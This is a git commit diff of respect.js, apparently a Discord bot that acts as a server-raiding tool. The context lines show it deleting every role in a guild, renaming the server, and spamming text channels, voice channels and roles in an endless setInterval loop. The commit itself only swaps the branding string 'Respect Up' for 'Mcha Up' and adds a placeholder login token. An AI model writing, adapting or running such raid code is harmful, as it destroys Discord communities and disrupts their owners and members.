26d96ecf4f5291ec8722a9743cb9bec88fa7071d
Mch4a <86424373+Mch4a@users.noreply.github.com>
2022-07-16 17:41:19 +0300

    Update respect.js

--- respect.js
+++ respect.js
@@ -15,16 +15,16 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Respect Up");////nawek dane bo sar server 
+      message.guild.setName("Mcha Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Respect Up", "text");///////bo channel 
-        message.guild.createChannel("Respect Up", "voice");////bo voice
-        message.guild.createRole({ name: "Respect Up" });////nawek dane bo role kan
+        message.guild.createChannel(" Mcha Up", "text");///////bo channel 
+        message.guild.createChannel("Mcha Up", "voice");////bo voice
+        message.guild.createRole({ name: "Mcha Up" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("Token Lera Dabni")
 
-////Respect Up////
+////Mcha Up////
